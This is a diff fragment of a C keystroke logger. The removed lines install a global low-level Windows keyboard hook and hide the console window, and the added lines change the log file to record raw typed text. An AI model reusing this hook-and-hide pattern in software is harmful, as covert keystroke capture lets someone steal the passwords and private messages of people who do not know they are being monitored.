@@ -15,16 +15,6 @@ int main()
     // Setting up time variable
     time_t curTime;
     curTime = time(NULL);
-
-    //Retrieve the applications instance
-    HINSTANCE instance = GetModuleHandle(NULL);
-    //Set a global Windows Hook to capture keystrokes using the function declared above
-    HHOOK test1 = SetWindowsHookEx( WH_KEYBOARD_LL, LowLevelKeyboardProc, instance,0);
-
-    HWND window;
-    AllocConsole();
-    window=FindWindowA("ConsoleWindowClass",NULL);
-    ShowWindow(window,0);
     
     if(logFile == NULL)
     {
@@ -39,23 +29,22 @@ int main()
     {
             curTime = time(NULL);// Update time every cycle
             keyPressed = getch();
-            printf("You pressed %c\n", keyPressed);
             switch(keyPressed)
             {
                 case 0x20: // space key is pressed
-                        fprintf(logFile, "\nUser pressed <Space Bar>\t|\tTime: %s", ctime(&curTime));
+                        fprintf(logFile, " ");
                     break;
                 case 0x1B: // Escape key is pressed
-                        fprintf(logFile, "\nUser pressed <ESC>\t|\tTime: %s", ctime(&curTime));
+                        fprintf(logFile, " ||| ESC PRESSED |||");
                     break;
                 case 0x09: // Tab key is pressed
-                      fprintf(logFile, "\nUser pressed <Tab>\t|\tTime: %s", ctime(&curTime));
+                      fprintf(logFile, "\t");
                     break;
                 case 0x08: // Backspace key is pressed
-                      fprintf(logFile, "\nUser pressed <Backspace>\t|\tTime: %s", ctime(&curTime));
+                      fprintf(logFile, "<= [backspace]");
                     break;
                 default:
-                      fprintf(logFile, "\nUser pressed <%c>\t|\tTime: %s", keyPressed, ctime(&curTime));
+                      fprintf(logFile, "%c", keyPressed);
                     break;
             }
 
